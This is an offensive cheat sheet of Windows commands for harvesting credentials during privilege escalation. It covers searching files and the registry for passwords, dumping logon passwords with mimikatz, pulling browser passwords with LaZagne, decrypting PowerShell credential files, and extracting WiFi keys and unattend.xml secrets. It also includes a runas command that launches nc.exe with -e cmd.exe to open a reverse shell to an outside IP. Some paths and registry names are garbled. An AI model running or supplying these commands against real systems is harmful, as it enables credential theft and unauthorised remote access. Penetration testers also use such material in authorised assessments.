### **FILE SEARCHING COMMANDS**

1.  Search for potentially risky files in the current directory and its subdirectories:  
    `dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* == *user*`
    
2.  Search for cleartext credentials:  
    `gci * -Include *.xml -Recurse -EA SilentlyContinue | select-string cpassword`
    
3.  search for IIS Web config file  
    `Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue`
    
4.  Find Files Containing "Password" Across Common Configuration File Types:  
    `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.ps1 *.bat *.zip`
    
5.  Hunt for SAM and SYSTEM Backups  
    `cd C: & dir /S /B SAM == SYSTEM == SAM.OLD == SYSTEM.OLD == SAM.BAK == SYSTEM.BAK`
    
6.  Use Tools Like winPEAS to Search for Files Containing Credentials:  
    `.\winPEASany.exe quiet cmd searchfast filesinfo`
    

### **SEARCHING FOR CREDENTIALS IN THE REGISTRY**

3.  Search for Passwords in HKEY_LOCAL_MACHINE (HKLM)  
    `reg query HKLM /f password /t REG_SZ /s`
4.  Search for Passwords in HKEY_CURRENT_USER (HKCU)  
    `reg query HKLU /f password /t REG_SZ /s`
5.  Retrieve Credentials from PuTTY  
    `reg query HKEY_CURRENT_USERSoftwareSimonTathamPuTTYSessions /f "Proxy" /s`

### **SAVED WINDOWS CREDENTIALS**

Windows provides the functionality to use and save other users' credentials. The following commands help list and Use these saved credentials:

1.  Automatically Identify Saved Credentials with winPEAS:  
    `.\winPEASx64.exe quiet cmd windowscreds`
2.  Check AutoLogon Credentials in registry:  
    `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`
3.  Extract plaintext passwords from memory using mimikatz:  
    `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"`
4.  Manually List Saved Credentials:  
    `cmdkey /list`
5.  Run Command with Saved Credentials:  
    `runas /savecred /user:admin cmd.exe`
6.  Prepare to Receive a Reverse Shell with Netcat:  
    `nc -lvnp 1337`
7.  Execute Commands Using Saved Credentials for a Reverse Shell:  
    `runas /env /noprofile /savecred /user:DESKTOP-T3I4BBK\administrator "c:\temp\nc.exe [IP-ADRESS] 1337 -e cmd.exe"`

### **POWERSHELL HISTORY FILE**

1.  Locate PowerShell History File:  
    `(Get-PSReadLineOption).HistorySavePath`
2.  Read Contents of PowerShell History File:  
    `gc (Get-PSReadLineOption).HistorySavePath`
3.  Retrieve PowerShell History Files for All Users:  
    `foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}`

### **BROWSER CREDENTIALS**

1.  Extract browser credentials using LaZagne:  
    `lazagne.exe browsers`
2.  Chrome Password  
    `gc 'C:UsersuserAppDataLocalGoogleChromeUser DataDefaultCustom Dictionary.txt' | Select-String password`

### **POWERSHELL CREDENTIALS**

1.  Import Credentials from XML File:  
    `$credential = Import-Clixml -Path 'C:\scripts\pass.xml'`
    
2.  Retrieve Username from Imported Credentials:  
    `$credential.GetNetworkCredential().Username`
    
3.  Retrieve Password from Imported Credentials:  
    `$credential.GetNetworkCredential().Password`
    
4.  Complete Example to Decrypt and Display Username and Password:
    
    ```PowerShell
    $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
    $username = $credential.GetNetworkCredential().Username
    $password = $credential.GetNetworkCredential().Password
    "Username: $username"
    "Password: $password"
    ```
    

### **STICKY NOTES PASSWORDS**

1.  Locate Sticky Notes Database Files:  
    `ls C:\Users\[USER]\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState`
    
2.  Set Execution Policy to Bypass for the Current Process:  
    `PS C:\> Set-ExecutionPolicy Bypass -Scope Process`
    
3.  Change Directory to Where PSSQLite is Located:  
    `PS C:\> cd .\PSSQLite\`
    
4.  Import the PSSQLite module:  
    `PS C:\PSSQLite> Import-Module .\PSSQLite.psd1`
    
5.  Define the path to the Sticky Notes database file:  
    `PS C:\PSSQLite> $db = 'C:\Users\[USER]\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'`
    
6.  Query Database to Retrieve Text of Notes:  
    `PS C:\PSSQLite> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | Format-Table -Wrap`
    
7.  Extract and View Contents of Database File Using Strings Command:  
    `strings 'C:\Users\[USER]\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite-wal'`
    

### **WIFI PASSWORDS**

1.  View List of All Saved Wireless Networks:  
    `PS C:\> netsh wlan show profile`
    
2.  Retrieve Password for a Specific Wireless Network Profile:  
    `PS C:\> netsh wlan show profile [PROFILE-NAME] key=clear`
    
3.  Oneliner method to extract wifi passwords from all the access point.  
    `cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on`
    

### **UNATTEND.XML**

When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

### **MANUALLY**

1.  `C:\Unattend.xml`

2.  `C:\Windows\Panther\Unattend.xml`

3.  `C:\Windows\Panther\Unattend\Unattend.xml`
    
4.  `C:\Windows\System32\sysprep.inf`
    
5.  `C:\Windows\System32\sysprep\sysprep.xml`
    

### **AUTOMATICALLY**

1.  Perform a detailed search for unattended and sysprep files:  
    `Get-ChildItem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue`
    
2.  Search for specific log and configuration files:  
    `dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul`
    
3.  Search for the term 'password' in all files:  
    `findstr /spin "password" *.*`
    
4.  Open the Unattend.xml File with a Text Editor to Review Content:  
    ```xml
    <AutoLogon>
        <Password>
            <Value>HackFast_p@ss</Value>
            <PlainText>true</PlainText>
        </Password>
        <Enabled>true</Enabled>
        <LogonCount>2</LogonCount>
        <Username>Administrator</Username>
    </AutoLogon>
    ```